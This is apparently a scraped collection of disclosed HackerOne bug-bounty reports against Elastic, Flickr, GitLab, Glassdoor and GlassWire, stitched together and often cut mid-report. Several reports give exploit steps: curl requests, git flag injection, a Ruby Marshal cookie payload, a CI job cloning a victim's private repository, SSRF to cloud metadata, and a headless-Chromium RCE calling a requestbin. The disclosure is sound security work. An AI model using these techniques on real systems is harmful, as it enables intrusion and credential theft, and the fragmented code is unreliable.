Reporting uses a headless Chromium to generate PNGs and PDFs. This is invoked (at least on Elastic Cloud, ECE and ECK) with --no-sandbox to work at all.
There are RCEs readily available for Chrome, and at least the versions shipped with 7.11 and 7.12 are susceptible to the attached example.
Attached is an adaptation of this exploit: https://github.com/rapid7/metasploit-framework/pull/15007/files#diff-42ae645fcacbd90d93296471ac57e1d734544af7fb082efd607db0a29d197ac4R53
I have not been able to devise a complete chain yet (thus the ""hazard""), but anything that enables pointing reporting at attacker-controlled JS would be able to pop an RCE this way. HTML-injection or XSS (even with the CSP a HTML injection will enable a redirect) or an open redirect would enable pointing reporting at custom JS code.
Steps To Reproduce:

Host the attached HTML somewhere, in my case it's available on http://192.168.0.154:8009/alexb-says-hi.html
Point the x-pack reporting-embedded Chromium at it (this step is missing to complete the chain)

Here's an example. The attached HTML file gets uname -a > /tmp/alexb-says-hi to be run:

Impact
Kibana is an HTML-injection (even without full-blown XSS) or an open redirect away from being RCE-able via Reporting.1 attachment:F1271128: alexb-says-hi.htmlalexbrasetvik   posted a comment. Apr 19th (2 years ago)I didn't click any of the ""Severity (Optional)"" things, intending to leave them unchecked. I missed the default being High, which it probably isn't without a first step to form a chain.
As I mention, this isn't a complete chain. If mixed with an HTML-injection (even without an XSS) or an open redirect (or a full-blown XSS), it'd be an RCE on Cloud and Kibana, though.alexbrasetvik   posted a comment. Apr 20th (2 years ago)So I managed to do an RCE on Elastic Cloud. Attached is a video demonstrating it, and the HTML payload used in the video, which triggers curl -k https://enu8lspgwcj2k.x.pipedream.net/?hifromelasticcloud
To access the viewer of the requestbin (because editing the payload is a bit onerous), you can access it via https://requestbin.com/r/enu8lspgwcj2k/1rRl9tN9tAMRN6muMXXQB4jjxdZ (I don't know how long that is valid for)
To point reporting's vulnerable chromium at a page that triggered the exploiting Javascript, I, uh, configured kibana.yml to just always respond with a Location header. Then, I pointed reporting at a /goto URL, which emits the right redirect header and status code, but with my custom redirect overriding whatever the goto was trying to send the user to. This gets me a vulnerable Chromium to run my payload, which in turn triggers the curl request shown in the video.
The kibana involved is https://0e193a35efd34736940bc3e00386aed8.us-west1.gcp.cloud.es.io:9243, and I'm sure you have execve logs that can confirm these curls :)2 attachments:F1272698: rce-via-reporting-chromium.movF1272699: curl-only.htmldouglas_day Elastic staff  posted a comment. Apr 20th (2 years ago)Nice Alex!

Looking forward to reading into this :) h1_analyst_jake HackerOne triage  changed the status to Needs more info. Apr 21st (2 years ago)Hi @alexbrasetvik,
Thanks for your report. I'm having difficulties reproducing the described behavior. Apparently, the file is correctly fetched according to my ngrok logs, but no code execution occurs:
Image F1273303: Screenshot_2021-04-21_at_12.13.29.png 599.00 KiBZoom in Zoom out Copy Download
I assume the payload used is strictly dependent on the host machine architecture/version. Can you please leave additional information on the OS version running the Docker service?
Regarding the severity, the --no-sandbox argument is actually a poor security practice and it's generally not recommended running the headless instance with that flag. As such, this somehow mitigates the attack as the victim must intentionally launch the command with such a flag.
Best,
@lugtag 1 attachment:F1273303: Screenshot_2021-04-21_at_12.13.29.pngalexbrasetvik   changed the status to New. Apr 21st (2 years ago)@lugtag ngrok ngrok tunnels are ephemeral, and you pointed it at something that probably just returned a 404. The first message with the alexb-says-hi.html attachment should be usable. Put that wherever and point headless_shell at it. (python -m SimpleHTTPServer 8000 will serve your cwd on port 8000)
I'm running Docker for Mac like you are. 

 the --no-sandbox argument is actually a poor security practice and it's generally not recommended running the headless instance with that flag.

I would agree. ECE and Elastic Cloud does run Kibana with the sandbox disabled, though, thus the hazard (and RCE on Elastic Cloud) - https://github.com/elastic/kibana/blob/master/x-pack/plugins/reporting/server/browsers/chromium/driver_factory/args.ts#L58-L60alexbrasetvik   posted a comment. Apr 21st (2 years ago)I made an updated recording that's maybe a bit easier to follow.

Elastic,1001-5000,0.0,1m-10m,"$3,000.00",High,8.8,Improper Access Control - Generic,Improper authorization on `/api/as/v1/credentials/` allows any App Search user to access all API keys and escalate privileges,"dee-see  submitted a report to Elastic.Apr 19th (2 years ago)Summary
Hello team, I hope you're doing well! App Search has a credentials page located at /as#/credentials that lists all the API keys a user has access to, if any. That same page will 404 for users with Analyst or Editor role. This is all working as intended, however there is also an API endpoint to query that same data at /api/as/v1/credentials/ and this will list all existing API keys for any authenticated user regardless of their App Search role.
Steps to reproduce
I'm going to use the cloud environment for the reproduction
Preparation

Log in App Search with the admin (elastic) user and go to the Users & roles page (/as#/role-mappings/)
Click Add mapping
In the Attribute value field enter h1-repro
In the Role box select Analyst
In the Engine Access select Limited Engine Access, no need to select any engine

We now have created the most limited role possible


Log in Kibana with the admin (elastic) user and go to the Stack Management > Users page (/app/management/security/users/)
Click Create user
In the Username field enter hi-repro
Set any password you like and then click Create user

Reproduction

Log in App Search with the h1-repro user
Navigate to /as#/role-mappings/ and observe that it's a 404 because you don't have access to this page
Navigate to /api/as/v1/credentials/ and observe that you have access to all the API keys

Impact
Privilege escalation. The default App Search install has a Private API Key with read/write access to all engines. If a Private Admin Key has been created before. the attacker can use it to create new API keys or delete existing ones.",https://hackerone.com/reports/1168528,California,United States,Mountain View,2021,4,19,13,20

Flickr,51-100,0.0,10m-50m,$500.00,Medium,5.3,Business Logic Errors,critical server misconfiguration lead to access to any user sensitive data which include user email and password,"mr_robert  submitted a report to Flickr.Oct 11th (about 1 year ago)Hi flickr team,
I found a critical issue lead to access to any user sensitive data which include user hashed password and possibly can lead to takeover any user account on  flickr's main site, literally i can get all  user information from database with no restrictions ,
Let me explain how this happen:
As we know Flickr that it was belong to Yahoo and also it was  hosted on many servers, including Amazon servers,
And after Flickr reboot as an independent and separate organization from Yahoo
This servers still has full access to Flickr’s main server databases
The attacker can use this old flickr server to get a lot of sensitive information belong to any user
By using “published user image name” and search by it ,on Flickr yahoo old server
For example :
We have user x  and he posted a photo named “golden_arrow_img”
Now let’s say the attacker know his victim user and now he know how to get all user sensitive data , he will go to misconfigured server  which it’s address is : https://34.235.208.201 But when he goes to this address, he only sees an error message and the logo of Flickr, and after a while of checking the available paths, I found that when I add the word start, all the content of the server appears,the address will be https://34.235.208.201/start , you will see a search box, go to search by the name of the published user image which is for example “golden_arrow_img”, but you will not see the results in The page, server will redirect you to the first error page , the request must be stopped by burp-suite proxy and send it to the repeater then repeat the request, you will see the results, search in the repeater results for the function called “Y.listData”
You will see under this function all user sensitive data, which is will be like :

GitLab,1001-5000,0.0,200m-1b,"$1,370.00",Medium,5.45,Improper Access Control - Generic,A deactivated user can access data through GraphQL,"joaxcar  submitted a report to GitLab.May 11th (2 years ago)Summary
A deactivated user should not be able to access information through the API. This rule is not enforced when making requests through the GraphQL endpoint. 
When reading through the changelog for 13.11.2 i noticed that the rule for a deactivated user allows for :log_in (as it should) but it is restricted from :access_api(as it should) link. The GraphQL endpoint does not seam to use this rules when authorizing a user. I guess GraphQL only checks for api scope on the user.
This opens for three potential problems:

A user using its account through the GraphQL API (through some script or similar) would not get a warning that the account is deactivated. This could lead to the account being removed if the entities controlling the GitLab instance has any automatic procedures deleting accounts. When reading about the deactivation feature I got the impression that most admins requesting the feature would use it in automated ""cleanings"" of their user base. I could see how an admin could implement a ""deactivate after 90 days inactivity"" and ""delete after 180 days inactivity"" rule or similar. This could lead to an account being ""in use"" through GraphQL could get deleted without proper warnings.
An admin could use deactivated accounts as ""bots"" or ""service accounts"" bypassing the billing of these accounts. (an admin can create users and deactivate them directly, before ever using the account)
The fact that the account should not be able to do this. An admin reading the docs are under the assumption that a deactivated account is blocked from using the API. An inactive user could have left some form of scripts running that would keep on using resources on the GitLab instance, which I guess the admin would like to remediate by deactivating the account.

as of 13.10.4: A deactivated user can (without activating its account) use read queries on the GraphQL endpoint. The latest security patch removes the ability to use mutations due to the fact that 
Code 148 BytesWrap lines Copy Download1  rule { deactivated }.policy do
2   prevent :access_git
3   prevent :access_api
4   prevent :receive_notifications
5   prevent :use_slash_commands
6 end
prevents :access_api, and
Code 61 BytesWrap lines Copy Download1rule { ~can?(:access_api) }.prevent :execute_graphql_mutation
prevents from using mutations if I understand the code correctly.
tested on 13.11.1:  (Prior to latest security patch 13.11.2) A deactivated user can (without activating its account) use queries and mutations on the GraphQL endpoint.
Steps to reproduce
Unlimited service accounts

Login as admin
Create a user
Deactivate the user
Create an api token for the deactivated user
Use the token in GraphQL requests such as (replacing url and token)

Code 186 BytesWrap lines Copy Download1curl 'https://gitlab.com/api/graphql' -H 'Accept: application/json' -H 'Content-Type: application/json' -H 'Authorization: Bearer <<TOKEN>>' --data '{""query"":""{\n  currentUser{id}\n}""}'d
User with deactivated account

Use any old token from your deactivated account in requests such as

Code 186 BytesWrap lines Copy Download1curl 'https://gitlab.com/api/graphql' -H 'Accept: application/json' -H 'Content-Type: application/json' -H 'Authorization: Bearer <<TOKEN>>' --data '{""query"":""{\n  currentUser{id}\n}""}'d
or on servers prior to 13.11.2 (tested on 13.11.1)

Login as admin
Create a user
Deactivate the user
Create an api token for the deactivated user
Add the user to a project with (use admin token, and a real project id)

Code 141 BytesWrap lines Copy Download1curl --header ""Authorization: Bearer <<ADMIN TOKEN>>"" ""https://gitlab.domain.com/api/v4/projects//members"" --data ""user_id=2&access_level=40""

Then perform a mutation with the disabled account:

Code 315 BytesWrap lines Copy Download1curl 'https://gitlab.domain.com/api/graphql' -H 'Content-Type: application/json' -H 'Accept: application/json' -H 'Authorization: Bearer <<DEACTIVATEDTOKEN>>' --data '{""query"":""mutation {\n  labelCreate(input:{title:\""deactivated\"", projectPath:\""test1/test1\""}){\n    errors\n    label{\n      id\n    }\n  }\n}""}'
to create a label in the project.
Impact
For GitLab it could lead to loss of revenue due to the ability to create accounts that are not billabel but ""usable"". At the moment the GraphQL API is a bit limited but will probably grow in scope.
For users. Running the risk of missing warnings about disabled accounts. Could lead to deletion of account if admins does not notice that the account is being used.
Examples
I would guess that this is affecting GitLab.com but can not create a disabled account there.
What is the current bug behavior?
With a token from a disabled account the REST API gives:
Code 280 BytesWrap lines Copy Download1curl --header ""Authorization: Bearer jKSvxhuDN-Noag6N-w7R"" ""http://gitlab.joaxcar.com/api/v4/user""
2
3{""message"":""403 Forbidden - Your account has been deactivated by your administrator. Please log back in from a web browser to reactivate your account at http://gitlab.joaxcar.com""}

2
3{""data"":{""currentUser"":{""id"":""gid://gitlab/User/15""}}}
What is the expected correct behavior?
GraphQL should give a warning as the REST API and block disabled users from accessing data.

GitLab,1001-5000,0.0,200m-1b,"$3,000.00",High,7.95,Authentication Bypass Using an Alternate Path or Channel,Ability to bypass email verification for OAuth grants results in accounts takeovers on 3rd parties,"cache-money  submitted a report to GitLab.Jul 13th (2 years ago)Summary
There's a limitation that requires a validated email before going through the OAuth flow, however this is bypassable. Bypassing this means the target site assumes your email is validated, and actually ends up signing you in with an non-validated email. This behavior can frequently lead to account takeovers in 3rd parties since they often use the email as an identifier, and fold all OAuth/manually created accounts into one. In my example I am going to demonstrate an account takeover on https://laravelshift.com/, however this concept is widely exploitable.
It should also be possible to use this technique to get into internal company using pages that just look for @domain.com in the email before allowing them access.
Steps to reproduce
1) Create a Bitbucket or GitHub account with a random email, and login to https://laravelshift.com/. (We're seeding a victim account).
2) In a different browser, create a new GitLab account with that same email but never confirm it.
3) In that browser, visit LaravelShift and click ""Sign in with GitLab"", notice you land on a page that states you cannot complete the OAuth grant without validating your email.
Run the following request in Burp replacing your cookies, CSRF token, and state parameter.

4) Notice the request succeeds with a 302 to LaravelShift with the code.
5) Visit that URL and notice you get logged into the victim's account from step 1. This works since the GitLab email is assumed to be trusted and validated.
Impact
Account takeovers on 3rd parties due to developers assuming GitLab is properly checking validated emails.
What is the current bug behavior?
It's possible to play the /oauth/authorize request directly to bypass the Verify the email address in your account profile before you sign in. prompt.
What is the expected correct behavior?
The email verification check should be enforced at this step of the process as well.

An attacker can run arbitrary pipeline jobs as a victim user. This means the attacker can access the user private repositories, member only repositories, registry, etc... by using the victim CI_JOB_TOKEN token.

This is only my recent research and I wanted to report it as soon as possible. I will update the report with more information later on.

Steps to reproduce
VICTIM:

Sign in to a GitLab instance as a Victim user
Create an arbitrary private repository with some private files. (We will steal this repo as a poc.)

ATTACKER ACCOUNT 1: 

Sign in to a GitLab instance as a Attacker1 user
Create a new project using the following settings:

Project Name: poc
Visibility Level : public
Check the Initialize repository with a README checkbox


Add a new .gitlab-ci.yml file to the project

Code 83 BytesWrap lines Copy Download1image: ""ruby:2.6""
2
3before_script:
4  - echo Hello
5
6rspec:
7  script:
8    - echo Hello

We will mirror this repository and update the .gitlab-ci.yml file later on to trigger the CI/CD job.

ATTACKER ACCOUNT 2: 

Sign in / Register to a GitLab instance as a Attacker2 user
Create a new public group called as test
Create a new project inside the test group using the following settings:

Project Name: poc
Visibility Level : public


Go to Project settings => Repository => Mirroring repositories

Set Git repository URL to the previously created repository by the Attacker1 user
Set Mirror direction to Pull
Check the Trigger pipelines for mirror updates checkbox
Click the Mirror repository button


Go to the test group Members option and invite the Victim user
Set the Victim user Choose a role permission to Owner
Go to the Account Setting => Account and delete this account.

ATTACKER ACCOUNT 1: 

Sign in back to the GitLab instance as a Attacker1 user
Go to the attacker1/poc project and update the .gitlab-ci.yml file using the following content:

Code 192 BytesWrap lines Copy Download1image: ""ruby:2.6""
2
3rspec:
4  script:
5    - git clone https://gitlab-ci-token:$CI_JOB_TOKEN@gitlab.com/victim/private_repo_name.git
6    - cd private_repo_name
7    - ls -lah .
8    - cat README.md

Wait half an hour to automatically trigger a mirror update in the test/poc project which owner is the Victim user.

The test/poc project will trigger a mirror update which also triggers a pipeline run. The triggerer of the pipeline will be the Victim user.
The Attacker1 user controls the attacker/poc/gitlab-ci.yml file which is mirrored to the test/poc project.
What is the current bug behavior?

If there is a mirrored project with Trigger pipelines for mirror updates enabled inside a group and the group owner delete its account (need another owner role inside the group) then the trigger of the pipeline will be to other owner account. (I think this only works when the account deleted without removing the account from the group members but I still need to confirm this.)

What is the expected correct behavior?

refuse pipeline run in the previously mentioned case

At the same time, as the root cause of the issue here is 'open-uri'. It's an SSRF issue at the same time.
Steps to reproduce

Use the import feature of gitlab.com to import the attached import.tar.gz as 'GitLab export' ███████
Wait the import process to finish
Access URL: https://gitlab.com/api/v4/projects/PROJECT_ID/import where PROJECT_ID is the id of the imported project, which could be found in the home page of the project.
The connection information of gitlab's production database is in the output, as attached.

Impact
For GitLab.com, this issue could be used to leak some critical credentials. I went through the charts in https://gitlab.com/gitlab-org/charts/gitlab/-/tree/master/charts/gitlab/charts/sidekiq/templates. It seems that there're a bunch of  juicy credentials could be leaked with this method, including Rails secret_key_base, database credentials and GitLab's smtp credentials. The object storage service account credential is limitedly accessed because of the 250 bytes limitation.
For self-hosted GitLab instances, this issue could cause more severe problems since most of self-hosted GitLab instances has sidekiq running with gitlab-rails & gitlab-shell. So .gitlab_shell_token could be easily downloaded and be used to access internal APIs such as '/api/v4/internal/personal_access_token', which could issue an private access token of an admin of someone else.

The UploadsRewriter does not validate the file name, allowing arbitrary files to be copied via directory traversal when moving an issue to a new project.
The pattern used to look for references is :
Code 91 BytesWrap lines Copy Download1  MARKDOWN_PATTERN = %r{\!?\[.*?\]\(/uploads/(?<secret>[0-9a-f]{32})/(?<file>.*?)\)}.freeze
This is used by the UploadsRewriter when copying an issue to also copy across the files:
Code 474 BytesWrap lines Copy Download1   @text.gsub(@pattern) do |markdown|
2          file = find_file(@source_project, $~[:secret], $~[:file])
3          break markdown unless file.try(:exists?)
4
5          klass = target_parent.is_a?(Namespace) ? NamespaceFileUploader : FileUploader
6          moved = klass.copy_to(file, target_parent)
7...
8   def find_file(project, secret, file)

10        uploader.retrieve_from_store!(file)
11        uploader
12      end
As there is no restriction on what file can be, path traversal can be used to copy any file.

It's possible to turn this into an RCE as the cookies_serializer is set to :hybrid by default.
The can be done by first grabbing the secret_key_base from /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml using the arbitrary file read and then use the experimentation_subject_id cookie with a Marshalled payload.
A payload can be generated by changing your own gitlab instances secret_key_base to match, then running the following in a rails console
Code 398 BytesWrap lines Copy Download1request = ActionDispatch::Request.new(Rails.application.env_config)

6depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, ""@result"", ActiveSupport::Deprecation.new)
7cookies.signed[:cookie] = depr
8puts cookies[:cookie]
Then send this cookie to the server:

GitLab,1001-5000,0.0,200m-1b,"$5,000.00",High,7.6,Server-Side Request Forgery (SSRF),GitLab::UrlBlocker validation bypass leading to full Server Side Request Forgery,"ajxchapman  submitted a report to GitLab.Apr 17th (4 years ago)Summary
The GitLab::UrlBlocker IP address validation methods suffer from a Time of Check to Time of Use (ToCToU) vulnerability. The vulnerability occurs due to multiple DNS resolution requests performed before and after the checks. This issue allows a malicious authenticated user to send GET and POST HTTP requests to arbitrary hosts, including the localhost, cloud metadata services and the local network, and read the HTTP response.
Details
The IP address validation code in /lib/gitlab/url_blocker.rb resolves the IP addresses of the provided URL domain, raises an exception if the resolved IP addresses match addresses in block lists (127.0.0.1, ::1, 169.254.0.0/16, etc.) or returns true if the IP address do not match the block lists.
Code 450 BytesWrap lines Copy Download1  begin
2    addrs_info = Addrinfo.getaddrinfo(uri.hostname, port, nil, :STREAM).map do |addr|
3      addr.ipv6_v4mapped? ? addr.ipv6_to_ipv4 : addr
4    end
5  rescue SocketError
6    return true
7  end
8
9  validate_localhost!(addrs_info) unless allow_localhost
10  validate_loopback!(addrs_info) unless allow_localhost
11  validate_local_network!(addrs_info) unless allow_local_network
12  validate_link_local!(addrs_info) unless allow_local_network
13
14  true
15end
If the address validates the GitLab::HTTP code then uses HTTParty to request the URL, which performs a second URL domain DNS resolution. The address validation checks can be bypassed if the URL domain resolves to a valid address for the first resolution then a forbidden address after the checks are performed. 
In order to perform this attack a DNS server must be configured to resolve a domain to alternating addresses with a low (or zero) Time To Live. To demonstrate this issue I used my researchersservers project (https://github.com/ajxchapman/sshreverseshell) with the configuration in 41_gitlab.json (F470655). Output of resolving gitlabextssrf.webhooks.pw against this DNS resolver configuration is shown below:

Notice the alternating resolved IP address and 0 ttl.
Attack scenario
Using the Web Hook integration functionality of a GitLab repository, this issue can be abused to send HTTP GET and POST requests to arbitrary IP addresses, with arbitrary path parameters. The following screenshot shows the response of an HTTP GET request to http://169.254.169.254/metadata/v1.json on a DigitalOcean droplet:
Image F470641: Screenshot_from_2019-04-17_09-18-49.png 66.91 KiBZoom in Zoom out Copy Download
Steps to reproduce
To demonstrate this issue I have configured the domain gitladextssrf.webhooks.pw to randomly resolve to either 198.211.125.160 or 127.0.0.1.

Create a new repository
Add a commit to the repository
Create a new Web Hook integration with the URL http://gitlabextssrf.webhooks.pw:9999.


This may take several attempts due to the random nature of the gitlabextssrf.webhooks.pw DNS resolver, if it fails with a 500 error, try again until it is accepted.


Log into the gitlab server and start a TCP listener on port 9999/tcp (e.g. nc -vvn -l -p 9999)
Perform numerous parallel requests to the Web Hook test endpoint. For this I use wfuzz

Code 213 BytesWrap lines Copy Download1$ ./wfuzz -X POST \

5  ""https://<domain>/<user>/<repo>/hooks/<hook_id>/test?trigger=push_events&test=FUZZ""
The the below video demonstration of reproducing this issue:

After several requests a connection will be made to the local TCP listener on port 9999/tcp.
Impact
This issue allows a malicious authenticated user to send GET and POST HTTP requests from the GitLab server to arbitrary hosts (including the localhost, cloud metadata services and the local network) with arbitrary paths, and read the HTTP response. This could be abused to compromise the host (e.g. leaking AWS tokens from the metadata service), or perform reconnaissance and exploitation of hosts on the local network.
What is the current bug behavior?
The GitLab::UrlBlocker validation code resolves the IP addresses of a URL domain, validates them against a series of block lists, and if valid returns to the GitLab::HTTP module which re-resolves the URL domain in order to perform the HTTP request.
What is the expected correct behavior?
The validated resolved addresses should be returned by GitLab::UrlBlocker and used by GitLab::HTTP to make the TCP connection to the destination host.

If I come across any way of accessing this I'll let you know.

Happy huntingestrike GitLab staff  reopened this report. Jun 4th (3 years ago)GitLab  rewarded ajxchapman with a $5,000 bounty. Jun 4th (3 years ago)Hi @ajxchapman ,
We want to thank you again for this report. After some internal discussion, we have decided to award you with a $5000 bounty, as your report helped us to recognize that the GCP metadata token was available through this exploit. We built upon your steps to customize the attack to obtain our own tokens on gitlab.com. 
As an immediate mitigation, we disabled the legacy GCP endpoint that would allow an attacker to obtain the token without a header. Most recently, we have patched the GitLab::HTTP library to use the validated IP address when making connections. This fix went out in GitLab 11.11.1.
Please let us know if you find that our patch does not mitigate your finding. For now, the issue will stay confidential as we work to address similar issues in other parts of the code base, but it will be made public 30 days after the final fix.
We look forward to your next report!

GitLab,1001-5000,0.0,200m-1b,"$3,500.00",Critical,9.5,Command Injection - Generic,Git flag injection leading to file overwrite and potential remote code execution,"vakzz  submitted a report to GitLab.Jul 22nd (3 years ago)Summary
The ref_name in the Commits API is not sanitized, allowing for a ref starting with -- to be provided causing git to interpret it as a flag instead of as a ref.
If a ref_name such as --output=/tmp/some_file is used then the following command is executed by gitaly in find_commits.go:
/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/ef/2d/ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d.git log --format=format:%H --max-count=20 --follow --output=/tmp/some_file -- .
followed by
/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/ef/2d/ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d.git rev-list --count --output=/tmp/some_file -- .
This first writes the list of commits to the file, but then the rev-list command fails but not before truncating the file.
Steps to reproduce

Create a repo and add a file
Use the commit api and pass in a ref_name such as --output=/tmp/written:

Code 101 BytesWrap lines Copy Download1curl 'http://4290d4225642/api/v4/projects/5/repository/commits?path=.&ref_name=--output=/tmp/written'

See that the file has been created:

Code 73 BytesWrap lines Copy Download1# ls -asl /tmp/written
20 -rw-r--r-- 1 git git 0 Jul 22 14:56 /tmp/written
Impact
The bug allows for arbitrary files to be briefly replaced with a known commit (or a list) and then truncated be empty, easily causing denial of service by replacing important files.
One attack scenario I thought of would be to truncate /var/opt/gitlab/gitlab-rails/etc/gitlab_shell_secret, which almost worked but ended up failing due to authenticate_by_gitlab_shell_token checking the token with unauthorized! unless Devise.secure_compare(secret_token, input) which fails if either are blank.
This method could potentially still work if a large number of requests were spammed, waiting until the unicorn restarts (eg for an upgrade). So long as a git log happens last before the server shuts down then the file will stay with the commit and not get truncated. I was able to reproduce this with around 32 connections then restarting:
Code 196 BytesWrap lines Copy Download1# gitlab-ctl restart unicorn
2ok: run: unicorn: (pid 46755) 1s
3root@4290d4225642:/var/opt/gitlab/gitlab-rails/etc# cat gitlab_shell_secret
4████████

7This then allows for use of the internal api:

{""api_version"":""v4"",""gitlab_version"":""12.0.3"",""gitlab_rev"":""08a51a9db93"",""redis"":true}

{""id"":1,""name"":""Administrator"",""username"":""root""}
Code 1.19 KiBWrap lines Copy Download1
2### What is the current *bug* behavior?
3
4The `ref_name` is not sanitized
5
6### What is the expected *correct* behavior?
7
8The `ref_name` should be sanitized to prevent it being used as git command flags.

GitLab,1001-5000,0.0,200m-1b,"$1,000.00",High,7.95,Server-Side Request Forgery (SSRF),SSRF on project import via the remote_attachment_url on a Note,"vakzz  submitted a report to GitLab.Mar 22nd (3 years ago)Summary
The Note model has an attachment which is provided by a CarrierWave uploader:
Code 46 BytesWrap lines Copy Download1mount_uploader :attachment, AttachmentUploader
One of the features this provides is the ability to download and attach a file via a url, see https://github.com/carrierwaveuploader/carrierwave/blob/v1.3.1/lib/carrierwave/mount.rb#L80. This means that the Note model has a method remote_attachment_url= which can be used to perform this action.
As this attribute isn't removed by the AttributeCleaner on project import, it can be set in the project.json for a note and will be set when the note is created, downloading the file:
https://github.com/carrierwaveuploader/carrierwave/blob/v1.3.1/lib/carrierwave/mounter.rb#L72
Code 357 BytesWrap lines Copy Download1  def remote_urls=(urls)
2      return if not urls or urls == """" or urls.all?(&:blank?)
3
4      @remote_urls = urls
5      @download_error = nil
6      @integrity_error = nil
7
8      @uploaders = urls.zip(remote_request_headers || []).map do |url, header|
9        uploader = blank_uploader
10        uploader.download!(url, header || {})
11        uploader
12      end
https://github.com/carrierwaveuploader/carrierwave/blob/v1.3.1/lib/carrierwave/uploader/download.rb#L43
Code 297 BytesWrap lines Copy Download1    def file
2          if @file.blank?
3            headers = @remote_headers.
4              reverse_merge('User-Agent' => ""CarrierWave/#{CarrierWave::VERSION}"")
5
6            @file = Kernel.open(@uri.to_s, headers)
7            @file = @file.is_a?(String) ? StringIO.new(@file) : @file
8          end
The downloaded file is then attached to the note and can be viewed from the newly imported project.
Any model that has a mount_uploader and is importable is potentially vulnerable to the same attack, although the majority of the others are AvatarUploader which checks the file type and prevents the response from being viewed.
Steps to reproduce

Create a new project
Create an issue in the project
Add a note to the issue
Export the project
Extract the export
Add  remote_attachment_url to the note hash with a url
Recompress the export and import it
View the note on the issue

What is the current bug behavior?
When importing a model that has a mount_uploader it's possible to use the carrierwave uploader seed attributes to download a file from any host: https://github.com/carrierwaveuploader/carrierwave/wiki/How-to:-Upload-remote-image-urls-to-your-seedfile
What is the expected correct behavior?
The attributes should be prohibited and removed via the AttributeCleaner

Impact

Allows an attacker to access internal services, for example the Omnibus GitLab has all of the exporters, Prometheus, Alertmanager exposed on localhost. 
If GitLab is hosted on AWS it allows for the instance metadata to be accessed.
Redis is running locally or accessible via tcp (address could be found by looking at the targets in Prometheus at http://localhost:9090/api/v1/targets) it could be possible to obtain RCE (similar to https://github.com/jas502n/gitlab-SSRF-redis-RCE#poc). A POST request is not possible here, but as remote_attachment_request_header= is also available (https://github.com/carrierwaveuploader/carrierwave/blob/v1.3.1/lib/carrierwave/mount.rb#L169) and not blacklisted, the payload could be set via a header.
If GitLab is hosted on Google Cloud, the above could be used to set the Metadata-Flavor: Google header and access http://metadata.google.internal/

thank you for sending in the report! 
We could reproduce the SSRF and are in the process of assessing the impact of your finding. You mentioned that it is possible to set custom HTTP headers on the request by setting remote_attachment_request_header:

as remote_attachment_request_header= is also available (https://github.com/carrierwaveuploader/carrierwave/blob/v1.3.1/lib/carrierwave/mount.rb#L169) and not blacklisted, the payload could be set via a header.

We were not able to set custom headers on the request with remote_attachment_request_header. Can you provide an example project export that demonstrates how to add customer headers?

vakzz   posted a comment. Mar 23rd (3 years ago)Hi @dappelt,
After trying to use a custom header on a project import I was unable to get it to work either (I had previously been testing this via a rails console after confirming it made it through the AttributeCleaner). I thought perhaps it was just an issue with randomness (depending on which attribute gets set first) but after digging into the rails code it looks like hash attributes are always set at the end:
Code 632 BytesWrap lines Copy Download1    def _assign_attributes(attributes)
2        multi_parameter_attributes  = {}
3        nested_parameter_attributes = {}
4
5        attributes.each do |k, v|
6          if k.include?(""("")
7            multi_parameter_attributes[k] = attributes.delete(k)
8          elsif v.is_a?(Hash)
9            nested_parameter_attributes[k] = attributes.delete(k)
10          end
11        end
12        super(attributes)
13
14        assign_nested_parameter_attributes(nested_parameter_attributes) unless nested_parameter_attributes.empty?
15        assign_multiparameter_attributes(multi_parameter_attributes) unless multi_parameter_attributes.empty?
16      end
As remote_attachment_request_header requires a hash to be passed in due to the following (and it's what Kernel.open expects) it will always be assigned last:
Code 200 BytesWrap lines Copy Download1# https://github.com/carrierwaveuploader/carrierwave/blob/v1.3.1/lib/carrierwave/uploader/download.rb#L40
2headers = @remote_headers.reverse_merge('User-Agent' => ""CarrierWave/#{CarrierWave::VERSION}"")
So in summary you can get remote_attachment_request_header= to be called but it will always happen after remote_attachment_url= meaning the header wont be set yet when the request is made, unless there is a away to create a Note and then retrieve and update it from the cache during the same import (but I can't see a way for that to happen).
Sorry about that, I should have tested it a bit more!

The ref param is passed directly to the git command without being sanitized.
What is the expected correct behavior?
The ref param should be sanitized or used in a way that doesn't allow for flag injection

take the value and add to HTML file and add your payload in locationId

One thing to consider - set the response header Content-Type: text/javascript. If this can be set and the ajax request handles this response just fine, this would have prevented the XSS attack from working in the first place as the browser would just render the injected HTML as plaintext in the browser.jjone Glassdoor staff  posted a comment. Aug 19th (about 1 year ago)thanks @vestige23 - I will check with the team if we can alter the response header to be plaintext.

The WAF does a good job blocking most javascript payloads and appears to block parentheses, backticks, and document objects. If I do find a way to bypass the WAF and execute a javascript alert or similar, I will add a comment to this report. 
However, it is still possible to inject payloads to achieve content injection and open redirects. The following <meta> tag redirect payload is not blocked by the WAF:

GlassWire,1-10,0.0,under-1m,$25.00,No value,0.0,Violation of Secure Design Principles,Bypass GlassWire's monitoring of Hosts file,"xiaoyinl  submitted a report to GlassWire.May 28th (6 years ago)Product version: 1.2.64beta
OS version: Windows 8.1 Enterprise x86
If a program modifies the Hosts file (C:\Windows\System32\drivers\etc\hosts), GlassWire notifies the user that ""system file changed"" with the path of the hosts file (see attachment ""screenshot_hosts_changed.png""). I discover that a malware (running with admin privilege) can change the content of hosts file without triggering this notification. The method is to use hardlink.
To reproduce:
Step 1: Open cmd.exe as administrator
Step 2: execute ""fsutil hardlink create c:\ProgramData\hosts.txt c:\windows\system32\drivers\etc\hosts"" in cmd.exe
Step 3: execute ""echo ::1 example.local>>c:\ProgramData\hosts.txt"" in cmd.exe
You can see that the notification is not triggered after step3. See ""screenshot_modified_via_hardlink_no_notification.png"".
Now execute ""echo ::1 example2.local>>c:\windows\system32\drivers\etc\hosts"" in cmd.exe. You receive a notification that hosts file is modified, prompted by GlassWire.

However, it appears that GlasswireSetup.exe still uses an unqualified path when running CertUtil.exe and as a consequence a trojaned CertUtil.exe will execute from the \Downloads\ folder. Interestingly, it executes without any security warning that Windows would normally show for a downloaded executable run from the shell (suggesting that CreateProcess was used rather than ShellExecute).
To fix this, it might make the most sense to set the current working directory to the System folder early in the Setup process.1 attachment:F67054: TrojanCertUtil.png",https://hackerone.com/reports/107213,Texas,United States,Austin,2015,12,28,19,4

